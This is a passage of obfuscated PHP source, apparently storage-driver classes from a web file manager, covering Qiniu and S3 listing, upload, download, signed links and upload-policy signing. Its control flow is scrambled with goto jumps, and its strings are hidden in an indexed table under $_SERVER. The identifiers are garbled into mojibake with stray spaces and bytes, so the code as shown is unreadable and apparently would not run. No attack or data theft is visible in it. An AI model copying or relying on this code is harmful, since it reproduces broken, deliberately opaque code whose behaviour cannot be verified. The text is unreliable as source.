f³§º‚øõö: return $AèÀö÷äÒˆ; goto CÜ’¿´ÖŒ§; b£ŸëêËù: $cÇñ”¥äÚÇ =& $_SERVER[£ü]; if ($CèçöÈˆ­Á) { return array($cÇñ”¥äÚÇ[28] => $this->pathThis($EÏ•ç©‰‘Ç), $cÇñ”¥äÚÇ[75] => $this->getPathOuter($cÇñ”¥äÚÇ[8] . $EÏ•ç©‰‘Ç), $cÇñ”¥äÚÇ[29] => $cÇñ”¥äÚÇ[76]); } $AèÀö÷äÒˆ = array($cÇñ”¥äÚÇ[28] => $this->pathThis($EÏ•ç©‰‘Ç), $cÇñ”¥äÚÇ[75] => $this->getPathOuter($cÇñ”¥äÚÇ[8] . $EÏ•ç©‰‘Ç), $cÇñ”¥äÚÇ[29] => $cÇñ”¥äÚÇ[76], $cÇñ”¥äÚÇ[184] => 0, $cÇñ”¥äÚÇ[107] => 0, $cÇñ”¥äÚÇ[1144] => !0, $cÇñ”¥äÚÇ[1145] => !0); goto eÉ¾’ÆõÂ; eÉ¾’ÆõÂ: $EÏ•ç©‰‘Ç = rtrim($EÏ•ç©‰‘Ç, $cÇñ”¥äÚÇ[8]) . $cÇñ”¥äÚÇ[8]; $D‰õ«†øùè = $this->objectMeta($EÏ•ç©‰‘Ç); if (isset($D‰õ«†øùè[$cÇñ”¥äÚÇ[1199]])) { $AèÀö÷äÒˆ[$cÇñ”¥äÚÇ[184]] = $D‰õ«†øùè[$cÇñ”¥äÚÇ[1199]]; } goto f³§º‚øõö; CÜ’¿´ÖŒ§: } public function listPath($a¨˜Õ˜ƒ‡™, $C ³Œâºö¤ = false) { goto f›Ú‘ÊÜ½Â; D‚—Ÿ¾›: $BÊäÙâ‘—˜ = $C‹Í¬èÑÊ“[33]; $E¦ºùå¡ä = 1000; $AâÃØî‡Š… = $C‹Í¬èÑÊ“[8]; goto aÉâò“‚¯; f›Ú‘ÊÜ½Â: $C‹Í¬èÑÊ“ =& $_SERVER[£ü]; $a¨˜Õ˜ƒ‡™ = trim($a¨˜Õ˜ƒ‡™, $C‹Í¬èÑÊ“[8]); $c—Å“øÉğ— = empty($a¨˜Õ˜ƒ‡™) ? $C‹Í¬èÑÊ“[33] : $a¨˜Õ˜ƒ‡™ . $C‹Í¬èÑÊ“[8]; goto D‚—Ÿ¾›; aÉâò“‚¯: $CÛÅáˆÛ = $eñ™í‘šÑ• = array(); while (!0) { list($f‚ëºŸËó…, $bçğô«ãõ…) = $this->bucketManager->listFiles($this->bucket, $c—Å“øÉğ—, $BÊäÙâ‘—˜, $E¦ºùå¡ä, $AâÃØî‡Š…); if ($bçğô«ãõ…) { return !1; } $BÊäÙâ‘—˜ = array_key_exists($C‹Í¬èÑÊ“[1165], $f‚ëºŸËó…) ? $BÊäÙâ‘—˜ = $f‚ëºŸËó…[$C‹Í¬èÑÊ“[1196]] : $C‹Í¬èÑÊ“[33]; if (isset($f‚ëºŸËó…[$C‹Í¬èÑÊ“[1200]])) { foreach ($f‚ëºŸËó…[$C‹Í¬èÑÊ“[1200]] as $c½ êØÉÉ†) { if ($c½ êØÉÉ† == $c—Å“øÉğ—) { continue; } $CÛÅáˆÛ[] = $this->folderInfo($c½ êØÉÉ†, $C ³Œâºö¤); } } if (isset($f‚ëºŸËó…[$C‹Í¬èÑÊ“[1197]])) { foreach ($f‚ëºŸËó…[$C‹Í¬èÑÊ“[1197]] as $Aø†«Ã»È) { if ($Aø†«Ã»È[$C‹Í¬èÑÊ“[89]] == $c—Å“øÉğ—) { continue; } $eñ™í‘šÑ•[] = $this->fileInfo($Aø†«Ã»È[$C‹Í¬èÑÊ“[89]], $C ³Œâºö¤, $Aø†«Ã»È); } } if ($BÊäÙâ‘—˜ == $C‹Í¬èÑÊ“[33]) { break; } } return array($C‹Í¬èÑÊ“[74] => $CÛÅáˆÛ, $C‹Í¬èÑÊ“[73] => $eñ™í‘šÑ•); goto E¨²¬Ê •ô; E¨²¬Ê •ô: } public function has($dÊ²æšÀ„‘, $e À´ÁîÆ¨ = false, $DŸí–Œ‡âß = true) { goto eèÊ¹ëò…; eèÊ¹ëò…: $a¦ÂÆÒªï¸ =& $_SERVER[£ü]; $dÊ²æšÀ„‘ = trim($dÊ²æšÀ„‘, $a¦ÂÆÒªï¸[8]); $eÍ”ù¬„ÄÃ = empty($dÊ²æšÀ„‘) ? $a¦ÂÆÒªï¸[33] : $dÊ²æšÀ„‘ . $a¦ÂÆÒªï¸[8]; goto c…ÑÃ×§«Í; b­ÈÍŸˆÛ: $CŠÊº’ÙÚÕ = 0; $aÁƒì ·é = 0; while (!0) { list($a ¼â»ƒ‰, $F¹öñäÀÃ) = $this->bucketManager->listFiles($this->bucket, $eÍ”ù¬„ÄÃ, $f ªß—Ïã, $aËæÊ‹İ­î, $BÑ‹ÜÇŞô); if ($F¹öñäÀÃ) { return !1; } $f ªß—Ïã = array_key_exists($a¦ÂÆÒªï¸[1165], $a ¼â»ƒ‰) ? $f ªß—Ïã = $a ¼â»ƒ‰[$a¦ÂÆÒªï¸[1196]] : $a¦ÂÆÒªï¸[33]; if ($e À´ÁîÆ¨) { if (!empty($a ¼â»ƒ‰[$a¦ÂÆÒªï¸[1197]])) { $CŠÊº’ÙÚÕ += count($a ¼â»ƒ‰[$a¦ÂÆÒªï¸[1197]]); } if (!empty($a ¼â»ƒ‰[$a¦ÂÆÒªï¸[1200]])) { $aÁƒì ·é += count($a ¼â»ƒ‰[$a¦ÂÆÒªï¸[1200]]); } if ($f ªß—Ïã === $a¦ÂÆÒªï¸[33]) { break; } continue; } if ($DŸí–Œ‡âß) { if (!empty($a ¼â»ƒ‰[$a¦ÂÆÒªï¸[1197]])) { return !0; } } else { if (!empty($a ¼â»ƒ‰[$a¦ÂÆÒªï¸[1200]])) { return !0; } } if ($f ªß—Ïã == $a¦ÂÆÒªï¸[33]) { break; } } goto e–ÁãŠ÷ôö; e–ÁãŠ÷ôö: if ($e À´ÁîÆ¨) { return array($a¦ÂÆÒªï¸[188] => $CŠÊº’ÙÚÕ, $a¦ÂÆÒªï¸[189] => $aÁƒì ·é); } return !1; goto e…˜È´ùíƒ; c…ÑÃ×§«Í: $f ªß—Ïã = $a¦ÂÆÒªï¸[33]; $aËæÊ‹İ­î = 1000; $BÑ‹ÜÇŞô = $a¦ÂÆÒªï¸[8]; goto b­ÈÍŸˆÛ; e…˜È´ùíƒ: } public function listAll($E›õŠÇÂ®) { $FÎáà‘Â¶õ =& $_SERVER[£ü]; $BÃ‰î½ö½Ï = $this->fileList($E›õŠÇÂ®, 1); $E¥Ó„²‚Ä­ = array(); foreach ($BÃ‰î½ö½Ï as $cÕ–šŒÎÜŠ) { $E¥Ó„²‚Ä­[$cÕ–šŒÎÜŠ[$FÎáà‘Â¶õ[28]]] = $cÕ–šŒÎÜŠ[$FÎáà‘Â¶õ[77]]; } return $this->listAllFiles($E›õŠÇÂ®, array_keys($E¥Ó„²‚Ä­), $E¥Ó„²‚Ä­); } public function canRead($fšÕÂÔˆ½) { return $this->exist($fšÕÂÔˆ½) ? !0 : !1; } public function canWrite($D®ø—ŸÖÈö) { return $this->exist($D®ø—ŸÖÈö) ? !0 : !1; } public function getContent($f…‰“¯Çƒ) { return $this->fileSubstr($f…‰“¯Çƒ, 0, -1); } public function setContent($CØôñ§ĞÒ, $FÀä¦Ò«Û = '') { $EÀíŸ‰ñ… = $this->tempFile($this->pathThis($CØôñ§ĞÒ)); file_put_contents($EÀíŸ‰ñ…, $FÀä¦Ò«Û); if ($this->upload($CØôñ§ĞÒ, $EÀíŸ‰ñ…)) { $this->tempFileRemve($EÀíŸ‰ñ…); return !0; } return !1; } public function refreshUrls($bôº³™‚šš) { goto eº¦» ³©; b÷ÁÕƒÚ‚: return $fÙœ’àÌ¯¤[$aíÍšé‰ [1201]] == $aíÍšé‰ [685] ? !0 : !1; goto eá¿Î£ÜÑõ; f¸¶îŒ×‡„: $CˆŞÑ…µŸ¤ = new Qiniu\Cdn\CdnManager($this->auth); list($fÙœ’àÌ¯¤, $B¹¼“á“´¾) = $CˆŞÑ…µŸ¤->refreshUrls($Dàšáô†—æ); if ($B¹¼“á“´¾) { return !1; } goto b÷ÁÕƒÚ‚; eº¦» ³©: $aíÍšé‰  =& $_SERVER[£ü]; $Dàšáô†—æ = array(); if (is_array($bôº³™‚šš)) { foreach ($bôº³™‚šš as $fé÷Œª˜Š›) { $Dàšáô†—æ[] = $this->link($fé÷Œª˜Š›); } } else { $Dàšáô†—æ[] = $this->link($bôº³™‚šš); } goto f¸¶îŒ×‡„; eá¿Î£ÜÑõ: } public function fileSubstr($D•Ä»ÌŸÅÖ, $aÂñ³¡¶¬´, $eÑß—îŠâĞ) { $A‡„¢¸ôÅä =& $_SERVER[£ü]; if (!($EÓÍªÆ¬èò = $this->link($D•Ä»ÌŸÅÖ))) { return !1; } $dÃ’ÙìçÓÅ = !1; if ($eÑß—îŠâĞ > 0) { $F¥÷–ª¸ØÉ = $aÂñ³¡¶¬´ + $eÑß—îŠâĞ - 1; $dÃ’ÙìçÓÅ = array($A‡„¢¸ôÅä[1202] . $aÂñ³¡¶¬´ . $A‡„¢¸ôÅä[408] . $F¥÷–ª¸ØÉ); } $fïø¾¹ƒ¯è = url_request($EÓÍªÆ¬èò, $A‡„¢¸ôÅä[213], !1, $dÃ’ÙìçÓÅ); return $fïø¾¹ƒ¯è[$A‡„¢¸ôÅä[678]] ? $fïø¾¹ƒ¯è[$A‡„¢¸ôÅä[1024]] : !1; } public function upload($D¢Œ«Û‚ÑŞ, $eÈ‹…Ô•¾, $fŒ¬îÍ‘Ê“ = false, $b¬£º¯´ÔÅ = REPEAT_REPLACE) { $b‚¼á‘‚ãâ = new Qiniu\Storage\UploadManager(); $e¿†óõèâĞ = $this->auth->uploadToken($this->bucket, $D¢Œ«Û‚ÑŞ); $fƒÙƒİ•Ç‹ = get_file_mime(get_path_ext($eÈ‹…Ô•¾)); list($a‘”á…—, $dâ¦ÚŸºõ) = $b‚¼á‘‚ãâ->putFile($e¿†óõèâĞ, $D¢Œ«Û‚ÑŞ, $eÈ‹…Ô•¾, null, $fƒÙƒİ•Ç‹); return $dâ¦ÚŸºõ ? !1 : $this->getPathOuter($D¢Œ«Û‚ÑŞ); } public function uploadFormData($a¼µµ›í¸¨, $fÑ¤çØÊÔ = 3600) { return $this->uploadToken($a¼µµ›í¸¨, $fÑ¤çØÊÔ); } public function multiUploadFormData($Eøè°‚¡ñé, $C¿†ë¬öšà = 3600) { return $this->uploadToken($Eøè°‚¡ñé, $C¿†ë¬öšà); } private function uploadToken($E÷Øé¡ã¾Œ, $dŸ¹æƒ‘˜ = 3600) { goto aµÜ¤ğ™¥£; aµÜ¤ğ™¥£: $fÊÅíšŠÌ =& $_SERVER[£ü]; $F°®çô¤› = $dŸ¹æƒ‘˜; $aßÂ¥•ÔÜ‘ = array($fÊÅíšŠÌ[1203] => $fÊÅíšŠÌ[1204]); goto A¹ù‚Ñô¨ó; d‘Û„äÃ¥¦: $eÑá”ŒÀí = http_type() . "\72\x2f\57\x75\x70\154\157\141\144{$c‘ó§¯ì}\56\161\x69\156\x69\165\160\x2e\143\157\x6d\57"; return array($fÊÅíšŠÌ[1206] => $c¾³ê«¤Ü, $fÊÅíšŠÌ[1207] => $eÑá”ŒÀí); goto eéŞÈ‹˜Ã; A¹ù‚Ñô¨ó: $BŠ­‹‘¿¨ = null; $c¾³ê«¤Ü = $this->auth->uploadToken($this->bucket, $BŠ­‹‘¿¨, $F°®çô¤›, $aßÂ¥•ÔÜ‘, !0); $c‘ó§¯ì = empty($this->region) || $this->region == $fÊÅíšŠÌ[1205] ? $fÊÅíšŠÌ[33] : $fÊÅíšŠÌ[408] . $this->region; goto d‘Û„äÃ¥¦; eéŞÈ‹˜Ã: } public function download($F¸ÂÏõÜÃè, $Eğª¦ˆ†òä) { goto DÏ²ø¾“¥; DÏ²ø¾“¥: $FÉô©Üñî = IO::getPathInner(IO::mkfile($Eğª¦ˆ†òä)); if (!($b¶ÊÁ²®•« = $this->link($F¸ÂÏõÜÃè))) { return !1; } $cÍŠğ¯£›Ô = 0; goto EøÍÛ°Ãã’; EøÍÛ°Ãã’: $d«ˆÙÙù¡„ = 1024 * 200; $b‘©õ¿Îô´ = fopen($FÉô©Üñî, $_SERVER[£ü][1208]); while (!0) { $C·Ù›ğé”„ = $this->fileSubstr($F¸ÂÏõÜÃè, $cÍŠğ¯£›Ô, $d«ˆÙÙù¡„); if ($C·Ù›ğé”„ === !1) { return !1; } fwrite($b‘©õ¿Îô´, $C·Ù›ğé”„); $cÍŠğ¯£›Ô += $d«ˆÙÙù¡„; if (strlen($C·Ù›ğé”„) < $d«ˆÙÙù¡„) { break; } } goto C²¢™ÒÙ¤; C²¢™ÒÙ¤: fclose($b‘©õ¿Îô´); return $Eğª¦ˆ†òä; goto cîßËÜÌ”²; cîßËÜÌ”²: } public function link($A‡õŞ—«ß, $a–æ“¤©ù’ = '') { if (!$this->isFile($A‡õŞ—«ß)) { return !1; } $Bô©ô‰ø…ˆ = $this->getHost() . $_SERVER[£ü][8] . $this->pathEncode($A‡õŞ—«ß) . $a–æ“¤©ù’; return $this->auth->privateDownloadUrl($Bô©ô‰ø…ˆ, 3600 * 12); } public function fileOut($DÄã•’²Ñ, $fÕ—–ïš° = false, $a„«¦µğò¹ = false, $CôÂ±‡¿‡ß = '') { $fÀ˜Ô…Ïİ =& $_SERVER[£ü]; if (!$a„«¦µğò¹) { $a„«¦µğò¹ = $this->pathThis($DÄã•’²Ñ); } $cä‹Ô’‹à = $fÕ—–ïš° ? $fÀ˜Ô…Ïİ[1209] . rawurlencode($a„«¦µğò¹) : $fÀ˜Ô…Ïİ[33]; $e“‹çŠÏ¶ = $this->link($DÄã•’²Ñ, $cä‹Ô’‹à); $this->fileOutLink($e“‹çŠÏ¶); } public function fileOutServer($EƒÖˆ¸°Ç’, $C¢Ì×êª×ê = false, $EŸœ•¯ƒ—  = false, $EÔå’Üø¸¬ = '') { parent::fileOut($EƒÖˆ¸°Ç’, $C¢Ì×êª×ê, $EŸœ•¯ƒ— , $EÔå’Üø¸¬); } public function fileOutImage($DÓ²ïÀ¬»ˆ, $EèÜË—¿¼ë = 250) { $e×ä°½×ÒÛ = $this->link($DÓ²ïÀ¬»ˆ, $_SERVER[£ü][1210] . $EèÜË—¿¼ë); $this->fileOutLink($e×ä°½×ÒÛ); } public function fileOutImageServer($BÁ£îÚ¡‚, $fùæî¾˜¨ = 250) { parent::fileOutImage($BÁ£îÚ¡‚, $fùæî¾˜¨); } public function hashMd5($f§¤ÀøŒ) { $AŠå¤ïÈ–½ =& $_SERVER[£ü]; $Aé°Õ» Â = $this->objectMeta($f§¤ÀøŒ); return isset($Aé°Õ» Â[$AŠå¤ïÈ–½[193]]) ? $Aé°Õ» Â[$AŠå¤ïÈ–½[193]] : !1; $Aƒğ´“‚‰‚ = $this->link($f§¤ÀøŒ, $AŠå¤ïÈ–½[1211]); } public function size($DË¬­ ¤°’) { $c†Ò˜º¹Æ¯ = $this->objectMeta($DË¬­ ¤°’); return $c†Ò˜º¹Æ¯ ? $c†Ò˜º¹Æ¯[$_SERVER[£ü][77]] : 0; } public function info($bòäê‰Ãƒª) { if ($this->isFolder($bòäê‰Ãƒª)) { return $this->folderInfo($bòäê‰Ãƒª); } else { if ($this->isFile($bòäê‰Ãƒª)) { return $this->fileInfo($bòäê‰Ãƒª); } } return !1; } public function exist($B‚¹‰¾¨Úò) { return $this->isFile($B‚¹‰¾¨Úò) || $this->isFolder($B‚¹‰¾¨Úò); } public function isFile($f‘ÍÒßÈ¼) { return !$this->isFolder($f‘ÍÒßÈ¼) && $this->objectMeta($f‘ÍÒßÈ¼); } public function isFolder($e…ÒöŠîÌÜ) { return $this->cacheMethod($_SERVER[£ü][220], $e…ÒöŠîÌÜ); } protected function objectMeta($c‰â´˜¨½) { return $this->cacheMethod($_SERVER[£ü][221], $c‰â´˜¨½); } protected function _objectMeta($eÏ÷ôšñŠ) { $D±±‡Ë×“‘ =& $_SERVER[£ü]; list($B¤ŒÌÕ¾¨, $A¥Òà©ìãÖ) = $this->bucketManager->stat($this->bucket, $eÏ÷ôšñŠ); if ($B¤ŒÌÕ¾¨) { $B¤ŒÌÕ¾¨[$D±±‡Ë×“‘[77]] = intval($B¤ŒÌÕ¾¨[$D±±‡Ë×“‘[1198]]); } return $B¤ŒÌÕ¾¨; } protected function _isFolder($fôÖé²ä†Ú) { $f¶õ†¿·½ =& $_SERVER[£ü]; list($Fœ²Çª–çÜ, $b½¿ç”) = $this->bucketManager->listFiles($this->bucket, trim($fôÖé²ä†Ú, $f¶õ†¿·½[8]) . $f¶õ†¿·½[8], $f¶õ†¿·½[33], 1, $f¶õ†¿·½[8]); return !empty($Fœ²Çª–çÜ[$f¶õ†¿·½[1197]]) || !empty($Fœ²Çª–çÜ[$f¶õ†¿·½[1200]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($C÷½ÅÒî×) { parent::__construct($C÷½ÅÒî×); } public function uploadFormData($bùÚå»¦‚º, $D¹ö¦õÅ¸á = 3600) { goto fˆ¾í¢Æ; còÆ¼–ÉÚ: $BÕ Åğ““æ = array($cøõ½¿Š¯İ[196] => $cøõ½¿Š¯İ[33], $cøõ½¿Š¯İ[1128] => $cøõ½¿Š¯İ[33], $cøõ½¿Š¯İ[1087] => $C¶•»±êë³, $cøõ½¿Š¯İ[1091] => $FÚ‹˜ŒŞ„, $cøõ½¿Š¯İ[1095] => $FŒ¡¥ƒšƒ‚, $cøõ½¿Š¯İ[1129] => $eĞ±ø‰õˆ, $cøõ½¿Š¯İ[1130] => $aìºŒÔ×âœ, $cøõ½¿Š¯İ[1131] => $D©­×õ£…Ä, $cøõ½¿Š¯İ[1132] => $bïùĞ¬ÏÂ, $cøõ½¿Š¯İ[1133] => $b·´Ô‚§•ñ, $cøõ½¿Š¯İ[166] => $this->getHost()); return $BÕ Åğ““æ; goto fÇùíö—Õ; E»–±¢½Àë: $d–½ç÷ÚÎ = array($this->accessKey, $cİ¶²ĞÁÒõ, $this->region, $cÔß¸•ê‘Ä, $Aˆƒ”Õ›™ì); $eĞ±ø‰õˆ = implode($cøõ½¿Š¯İ[8], $d–½ç÷ÚÎ); $B”ë¯ê­‰ñ = array($cøõ½¿Š¯İ[1085] => gmdate($cøõ½¿Š¯İ[1084], strtotime($cøõ½¿Š¯İ[1119])), $cøõ½¿Š¯İ[1086] => array(array($cøõ½¿Š¯İ[1088] => $this->bucket), array($cøõ½¿Š¯İ[1087] => $C¶•»±êë³), array($cøõ½¿Š¯İ[1089], $cøõ½¿Š¯İ[1090], $cøõ½¿Š¯İ[33]), array($cøõ½¿Š¯İ[1089], $cøõ½¿Š¯İ[1120], $cøõ½¿Š¯İ[33]), array($cøõ½¿Š¯İ[1089], $cøõ½¿Š¯İ[1121], $cøõ½¿Š¯İ[33]), array($cøõ½¿Š¯İ[1091] => $FÚ‹˜ŒŞ„), array($cøõ½¿Š¯İ[1122] => $eĞ±ø‰õˆ), array($cøõ½¿Š¯İ[1123] => $aìºŒÔ×âœ), array($cøõ½¿Š¯İ[1124] => $D©­×õ£…Ä), array($cøõ½¿Š¯İ[1125] => $bïùĞ¬ÏÂ))); goto cÚ×¤îèÚÄ; cÚ×¤îèÚÄ: $FŒ¡¥ƒšƒ‚ = base64_encode(json_encode($B”ë¯ê­‰ñ)); $f•ò–Çí£› = hash_hmac($cøõ½¿Š¯İ[1126], $cİ¶²ĞÁÒõ, $cøõ½¿Š¯İ[1127] . $this->secret, !0); $bÏºïóİ© = hash_hmac($cøõ½¿Š¯İ[1126], $this->region, $f•ò–Çí£›, !0); goto fÀÆ¬©‰ä; fˆ¾í¢Æ: $cøõ½¿Š¯İ =& $_SERVER[£ü]; $C¶•»±êë³ = $cøõ½¿Š¯İ[182]; $aìºŒÔ×âœ = $cøõ½¿Š¯İ[1116]; goto BÉÍâ ²Èé; CŒÕ©ÒÈ˜§: $Aˆƒ”Õ›™ì = $cøõ½¿Š¯İ[1118]; $bïùĞ¬ÏÂ = $D¹ö¦õÅ¸á . $cøõ½¿Š¯İ[33]; $FÚ‹˜ŒŞ„ = $cøõ½¿Š¯İ[1083]; goto E»–±¢½Àë; fÀÆ¬©‰ä: $CÍôŠ†åîÁ = hash_hmac($cøõ½¿Š¯İ[1126], $cÔß¸•ê‘Ä, $bÏºïóİ©, !0); $E…³Îäœ†Ë = hash_hmac($cøõ½¿Š¯İ[1126], $Aˆƒ”Õ›™ì, $CÍôŠ†åîÁ, !0); $b·´Ô‚§•ñ = hash_hmac($cøõ½¿Š¯İ[1126], $FŒ¡¥ƒšƒ‚, $E…³Îäœ†Ë); goto còÆ¼–ÉÚ; BÉÍâ ²Èé: $cÔß¸•ê‘Ä = $cøõ½¿Š¯İ[59]; $D©­×õ£…Ä = gmdate($cøõ½¿Š¯İ[1117]); $cİ¶²ĞÁÒõ = gmdate($cøõ½¿Š¯İ[679]); goto CŒÕ©ÒÈ˜§; fÇùíö—Õ: } public function multiUploadFormData($dºÍ¨ôÕËé, $bÎ¼„ŞÈÏ˜ = 3600) { $eÍé¸¶Ì =& $_SERVER[£ü]; $d£İ™Æºâ = gmdate($eÍé¸¶Ì[1212]); $CÊŠÈ’õÄÈ = array(); $BŒš³‘¯ÊÃ = $this->client->getUploadId($this->bucket, $dºÍ¨ôÕËé, $CÊŠÈ’õÄÈ); if (!$BŒš³‘¯ÊÃ) { return !1; } return array($eÍé¸¶Ì[206] => $BŒš³‘¯ÊÃ, $eÍé¸¶Ì[166] => $this->getHost() . $eÍé¸¶Ì[8] . $this->pathEncode($dºÍ¨ôÕËé), $eÍé¸¶Ì[207] => $d£İ™Æºâ, $eÍé¸¶Ì[89] => $dºÍ¨ôÕËé); } public function multiUploadAuthData($dàì˜•¯ìŞ, $Cğ—í·éİ• = array()) { goto bÙ†Ö¥öÚ•; A±Ì§’Œ¼: unset($Cğ—í·éİ•[$E«Äç–ÈÀ©[89]]); if (isset($Cğ—í·éİ•[$E«Äç–ÈÀ©[208]])) { return $this->listUploadParts($aµİ‰ïå£, $Cğ—í·éİ•); } $Dà™Ã†“‰ = array(); goto b³àØ™ŸĞ‚; b³àØ™ŸĞ‚: if (isset($Cğ—í·éİ•[$E«Äç–ÈÀ©[1213]])) { $Dà™Ã†“‰[$E«Äç–ÈÀ©[1214]] = $Cğ—í·éİ•[$E«Äç–ÈÀ©[1213]]; } $FÆ±éœâÍ‰ = explode($E«Äç–ÈÀ©[168], $this->getHost()); $D£ŞÉÖïñÙ = array($E«Äç–ÈÀ©[1215] => $FÆ±éœâÍ‰[1], $E«Äç–ÈÀ©[1216] => $E«Äç–ÈÀ©[33], $E«Äç–ÈÀ©[196] => $E«Äç–ÈÀ©[116], $E«Äç–ÈÀ©[1128] => $Cğ—í·éİ•[$E«Äç–ÈÀ©[77]]); goto B‡ê©·¸ò; B‡ê©·¸ò: $E’ÍÈ®˜Ä = $E«Äç–ÈÀ©[211]; $bĞº¯ƒíèª = $E«Äç–ÈÀ©[8] . $this->pathEncode($aµİ‰ïå£) . $B•×ğ”­î; $d˜¤…ùó“ğ = $this->client->__getSignatureV4($Dà™Ã†“‰, $D£ŞÉÖïñÙ, $E’ÍÈ®˜Ä, $bĞº¯ƒíèª); goto C¢İÎ¯›Î; bÙ†Ö¥öÚ•: $E«Äç–ÈÀ© =& $_SERVER[£ü]; $B•×ğ”­î = isset($Cğ—í·éİ•[$E«Äç–ÈÀ©[157]]) ? $Cğ—í·éİ•[$E«Äç–ÈÀ©[157]] : $E«Äç–ÈÀ©[33]; $aµİ‰ïå£ = $Cğ—í·éİ•[$E«Äç–ÈÀ©[89]]; goto A±Ì§’Œ¼; C¢İÎ¯›Î: if (strpos($B•×ğ”­î, $E«Äç–ÈÀ©[210]) === 0) { if (isset($Dà™Ã†“‰[$E«Äç–ÈÀ©[1214]])) { $E‰³µÖšŠÄ = $Dà™Ã†“‰[$E«Äç–ÈÀ©[1214]]; } else { if (isset($d˜¤…ùó“ğ[$E«Äç–ÈÀ©[1214]])) { $E‰³µÖšŠÄ = $d˜¤…ùó“ğ[$E«Äç–ÈÀ©[1214]]; } else { $E‰³µÖšŠÄ = hash($E«Äç–ÈÀ©[1126], $E«Äç–ÈÀ©[33]); } } return array($E«Äç–ÈÀ©[217] => $d˜¤…ùó“ğ[$E«Äç–ÈÀ©[217]], $E«Äç–ÈÀ©[1214] => $E‰³µÖšŠÄ, $E«Äç–ÈÀ©[207] => $d˜¤…ùó“ğ[$E«Äç–ÈÀ©[1217]]); } return $d˜¤…ùó“ğ[$E«Äç–ÈÀ©[217]]; goto C—òÕ; C—òÕ: } public function listUploadParts($cÄ“š“‹·â, $F«È•½Î¤ = array()) { goto bàÍ·­‰ã‡; D®Óç÷°¾Ã: $DŠØêê‡¶Û = array($e¦´›™»¤[1215] => $b§²¤¹§®»[1], $e¦´›™»¤[196] => $e¦´›™»¤[116], $e¦´›™»¤[1128] => strlen($EêçÅÛÙŞ)); $aÅ´ö¢ˆ»æ = $e¦´›™»¤[209]; $D–×ˆĞÍŠ™ = $e¦´›™»¤[8] . $this->pathEncode($cÄ“š“‹·â) . $F«È•½Î¤[$e¦´›™»¤[157]]; goto cÁˆÚÍ¨ÛÜ; bàÍ·­‰ã‡: $e¦´›™»¤ =& $_SERVER[£ü]; $B×åï¤ ‹ = str_replace($e¦´›™»¤[218], $e¦´›™»¤[33], $F«È•½Î¤[$e¦´›™»¤[157]]); $A¾óì¡ê³ = $this->client->listParts($this->bucket, $cÄ“š“‹·â, $B×åï¤ ‹); goto bË¨ø§´×Š; f†–ù÷ïÛ: $EêçÅÛÙŞ .= $e¦´›™»¤[1221]; $BùØµ›İã‘ = array(); $b§²¤¹§®» = explode($e¦´›™»¤[168], $this->getHost()); goto D®Óç÷°¾Ã; cÁˆÚÍ¨ÛÜ: $E¤¬½õ¬× = $this->client->__getSignatureV4($BùØµ›İã‘, $DŠØêê‡¶Û, $aÅ´ö¢ˆ»æ, $D–×ˆĞÍŠ™, $EêçÅÛÙŞ); return array($e¦´›™»¤[217] => $E¤¬½õ¬×[$e¦´›™»¤[217]], $e¦´›™»¤[207] => $E¤¬½õ¬×[$e¦´›™»¤[1217]], $e¦´›™»¤[219] => $A¾óì¡ê³, $e¦´›™»¤[1214] => $E¤¬½õ¬×[$e¦´›™»¤[1214]]); goto F½²Å•åÖ; bË¨ø§´×Š: if (!$A¾óì¡ê³) { return !1; } $EêçÅÛÙŞ = $e¦´›™»¤[1218]; foreach ($A¾óì¡ê³ as $CÌÎ¢ªºã“) { $EêçÅÛÙŞ .= $e¦´›™»¤[1219] . "\74\x50\x61\162\164\x4e\165\x6d\142\x65\162\76{$CÌÎ¢ªºã“[$e¦´›™»¤[1170]]}\x3c\57\x50\141\x72\x74\x4e\x75\155\142\145\x72\x3e\12" . "\x3c\105\124\141\x67\76{$CÌÎ¢ªºã“[$e¦´›™»¤[1171]]}\x3c\x2f\105\x54\x61\x67\x3e\12" . $e¦´›™»¤[1220]; } goto f†–ù÷ïÛ; F½²Å•åÖ: } public function link($Fš»¿ØêÓ, $FÔ­Ê©Ä³å = array()) { return parent::link($Fš»¿ØêÓ, $FÔ­Ê©Ä³å); } public function fileOut($fÄï°»Àœ¡, $C˜ØöõŸÏ = false, $c¶ÛÇí¡ = false, $e–¢›¥Ó¼Ğ = '') { if (strstr($this->endpoint, $_SERVER[£ü][1222])) { return parent::fileOutServer($fÄï°»Àœ¡, $C˜ØöõŸÏ, $c¶ÛÇí¡, $e–¢›¥Ó¼Ğ); } parent::fileOut($fÄï°»Àœ¡, $C˜ØöõŸÏ, $c¶ÛÇí¡, $e–¢›¥Ó¼Ğ); } public function fileOutImage($cÛ³ÈéíÏÏ, $Cß”ÖÎËŠê = 250) { if (strstr($this->endpoint, $_SERVER[£ü][1222])) { return parent::fileOutImageServer($cÛ³ÈéíÏÏ, $Cß”ÖÎËŠê); } parent::fileOutImage($cÛ³ÈéíÏÏ, $Cß”ÖÎËŠê); } public function fileOutLink($BÜÎëÈ¶½) { $f„’†¡ÚÕª =& $_SERVER[£ü]; if (substr($BÜÎëÈ¶½, 0, 7) == $f„’†¡ÚÕª[1098]) { $BÜÎëÈ¶½ = $f„’†¡ÚÕª[1099] . substr($BÜÎëÈ¶½, 7); } header($f„’†¡ÚÕª[153] . $BÜÎëÈ¶½); die; } public function getHost() { $dÊ„¢äò¶ =& $_SERVER[£ü]; $E‚¯½‹äŞ³ = str_rtrim(parent::getHost(), $dÊ„¢äò¶[8] . $this->bucket); $E‚¯½‹äŞ³ = explode($dÊ„¢äò¶[168], $E‚¯½‹äŞ³); return $E‚¯½‹äŞ³[0] . $dÊ„¢äò¶[168] . $this->bucket . $dÊ„¢äò¶[93] . $E‚¯½‹äŞ³[1]; } } goto e’®Çå‡˜; BäŠ–»êŸ: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($bÕ‚Èß›‘š) { if (substr($bÕ‚Èß›‘š, 0, 2) == $_SERVER[£ü][1137]) { $bÕ‚Èß›‘š = BASIC_PATH . substr($bÕ‚Èß›‘š, 2); } return $bÕ‚Èß›‘š; } public function iconvApp($d“Áóòîˆ) { $c‚›©êÚ•ª =& $_SERVER[£ü]; global $config; return $this->iconvTo($d“Áóòîˆ, $config[$c‚›©êÚ•ª[1135]], $config[$c‚›©êÚ•ª[1134]]); } public function iconvSystem($Eå¾±Ğ™Í) { $dãóŞãì‘Ù =& $_SERVER[£ü]; global $config; return $this->iconvTo($Eå¾±Ğ™Í, $config[$dãóŞãì‘Ù[1134]], $config[$dãóŞãì‘Ù[1135]]); } public function getPathOuter($F‘»İòñµš) { goto 